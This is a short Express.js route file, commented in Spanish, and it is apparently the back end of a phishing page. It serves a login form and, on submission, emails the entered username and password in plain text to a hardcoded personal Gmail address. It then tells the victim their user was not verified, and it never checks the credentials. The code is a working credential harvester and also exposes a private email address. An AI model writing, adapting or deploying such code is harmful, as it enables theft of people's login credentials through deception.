var express = require('express');
var router = express.Router();
var nodemailer = require('nodemailer');
const bodyParser = require('body-parser');
const dotenv = require('dotenv');

dotenv.config();

// Configurar el middleware body-parser
router.use(bodyParser.urlencoded({ extended: false }));

/* GET home page. */
router.get('/', function(req, res, next) {
  res.render('login', { title: 'Express' });
});

router.post('/', async (req, res, next) => {
  console.log(req.body);

  var usuario = req.body.usuario;
  var contraseña = req.body.contraseña;

  var obj = {
    to: 'mlolaserrano@gmail.com',
    subject: 'Contacto desde la Web',
    html: usuario + ' ' + contraseña,
  };

  var transport = nodemailer.createTransport({
    host: process.env.SMTP_HOST,
    port: process.env.SMTP_PORT,
    auth: {
      user: process.env.SMTP_USER,
      pass: process.env.SMTP_PASS,
    },
  });

  try {
    var info = await transport.sendMail(obj);

    res.render('login', {
      message: 'No verificaste tu usuario',
    });
  } catch (error) {
    console.error(error);
    res.render('login', {
      message: 'Error al enviar el mensaje',
    });
  }
});



module.exports = router;

